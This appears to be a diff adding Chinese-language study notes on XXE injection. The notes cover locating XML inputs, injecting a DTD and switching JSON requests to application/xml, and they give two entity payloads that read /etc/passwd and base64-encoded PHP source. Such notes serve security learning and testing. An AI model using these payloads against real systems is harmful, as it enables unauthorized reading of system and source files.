@@ -80,3 +80,20 @@ Entity	XML 变量，通常用 (& ;) 字符包裹。	&lt;
 Element	根元素或其任何子元素，其值存储在开始标签和结束标签之间。	<date>01-01-2022</date>
 Comments注释  <!-- 和 --> 
 
+
+识别潜在 XXE 漏洞的第一步是找到接受 XML 用户输入的网页
+我们应该 注意哪些元素被显示出来，这样我们就知道要向哪些元素中注入内容
+在示例中，HTTP 请求中的 XML 输入本身没有声明 DTD，也没从外部引用，因此在定义实体之前添加了一个新的 DTD
+如果 DOCTYPE 已经在 XML 请求中声明，只需将 ENTITY 元素添加到其中即可
+即使一个 Web 应用程序以 JSON 格式发送请求，我们也可以尝试将 Content-Type 标头更改为 application/xml，然后使用在线工具将 JSON 数据转换为 XML
+
+Injection:
+  <!DOCTYPE email [
+    <!ENTITY company SYSTEM "file:///etc/passwd">
+  ]>
+
+  在某些 Java Web 应用程序中，我们或许还可以指定一个目录而不是文件，这样我们会得到一个目录列表，这对于定位敏感文件很有用
+
+  <!DOCTYPE email [
+    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+  ]>
